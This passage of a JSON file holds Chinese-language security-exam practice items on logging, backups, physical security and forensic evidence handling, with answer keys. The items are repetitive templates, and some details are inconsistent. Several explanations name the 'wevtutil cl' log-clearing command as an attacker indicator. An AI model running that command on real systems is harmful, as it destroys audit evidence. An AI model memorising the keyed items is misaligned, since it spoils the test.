        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-761",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 180 天（約半年）以上",
      "B. 只要硬碟有空間才保存，無強制期限",
      "C. 至少保存 7 天",
      "D. 至少保存 30 天"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-762",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 系統成功重啟",
      "B. 防毒軟體更新成功",
      "C. 建立了新的使用者帳號",
      "D. 安全審核日誌遭到手動或指令清除（The audit log was cleared）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-763",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 允許每台伺服器手動由管理員隨意調整時間",
      "B. 關閉所有日誌之時間標籤",
      "C. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器",
      "D. 每天由人工打卡確認"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-764",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某區域教學醫學中心資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 單純 Ping 掃描",
      "B. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "C. 無憑證黑箱掃描",
      "D. 網域名稱查詢"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-765",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 完全不做備份，僅靠防毒軟體",
      "B. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "C. 將備份檔透過匿名 FTP 上傳",
      "D. 僅備份至本機 C 槽桌面"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-766",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 需要過去一個月內的所有備份",
      "B. 僅需要週三的增量備份",
      "C. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "D. 僅需要週日的完整備份"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-767",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某跨國金融控股銀行核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 長期開啟大門保持通風",
      "B. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "C. 一般木質喇叭鎖門",
      "D. 僅張貼「請勿尾隨」之警語告示牌"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-768",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 泡沫滅火系統",
      "B. 乾粉滅火器手動噴灑",
      "C. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "D. 傳統高壓水柱灑水系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-769",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 僅在 Windows 中執行「右鍵格式化」",
      "B. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "C. 撕除硬碟標籤即可",
      "D. 直接丟入一般垃圾桶"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-770",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 將網路線拔除防止惡意連線向外傳輸",
      "B. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-771",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 7 天",
      "B. 至少保存 180 天（約半年）以上",
      "C. 只要硬碟有空間才保存，無強制期限",
      "D. 至少保存 30 天"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-772",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某區域教學醫學中心監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "B. 建立了新的使用者帳號",
      "C. 防毒軟體更新成功",
      "D. 系統成功重啟"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-773",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 每天由人工打卡確認",
      "B. 允許每台伺服器手動由管理員隨意調整時間",
      "C. 關閉所有日誌之時間標籤",
      "D. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-774",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某跨國金融控股銀行資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 無憑證黑箱掃描",
      "B. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "C. 單純 Ping 掃描",
      "D. 網域名稱查詢"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-775",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 將備份檔透過匿名 FTP 上傳",
      "B. 僅備份至本機 C 槽桌面",
      "C. 完全不做備份，僅靠防毒軟體",
      "D. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-776",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某跨國金融控股銀行每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週日的完整備份",
      "B. 僅需要週三的增量備份",
      "C. 需要過去一個月內的所有備份",
      "D. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-777",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 長期開啟大門保持通風",
      "B. 一般木質喇叭鎖門",
      "C. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "D. 僅張貼「請勿尾隨」之警語告示牌"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-778",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某區域教學醫學中心新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 乾粉滅火器手動噴灑",
      "B. 泡沫滅火系統",
      "C. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "D. 傳統高壓水柱灑水系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-779",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "B. 直接丟入一般垃圾桶",
      "C. 撕除硬碟標籤即可",
      "D. 僅在 Windows 中執行「右鍵格式化」"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-780",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "B. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 將網路線拔除防止惡意連線向外傳輸"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-781",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 30 天",
      "B. 至少保存 7 天",
      "C. 至少保存 180 天（約半年）以上",
      "D. 只要硬碟有空間才保存，無強制期限"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-782",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某跨國金融控股銀行監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 防毒軟體更新成功",
      "B. 建立了新的使用者帳號",
      "C. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "D. 系統成功重啟"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-783",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 關閉所有日誌之時間標籤",
      "B. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器",
      "C. 允許每台伺服器手動由管理員隨意調整時間",
      "D. 每天由人工打卡確認"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-784",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 無憑證黑箱掃描",
      "B. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "C. 網域名稱查詢",
      "D. 單純 Ping 掃描"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-785",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 僅備份至本機 C 槽桌面",
      "B. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "C. 完全不做備份，僅靠防毒軟體",
      "D. 將備份檔透過匿名 FTP 上傳"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-786",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週三的增量備份",
      "B. 需要過去一個月內的所有備份",
      "C. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "D. 僅需要週日的完整備份"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-787",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 僅張貼「請勿尾隨」之警語告示牌",
      "B. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "C. 一般木質喇叭鎖門",
      "D. 長期開啟大門保持通風"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-788",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 泡沫滅火系統",
      "B. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "C. 傳統高壓水柱灑水系統",
      "D. 乾粉滅火器手動噴灑"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-789",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 僅在 Windows 中執行「右鍵格式化」",
      "B. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "C. 直接丟入一般垃圾桶",
      "D. 撕除硬碟標籤即可"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-790",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "B. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "C. 將網路線拔除防止惡意連線向外傳輸",
      "D. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
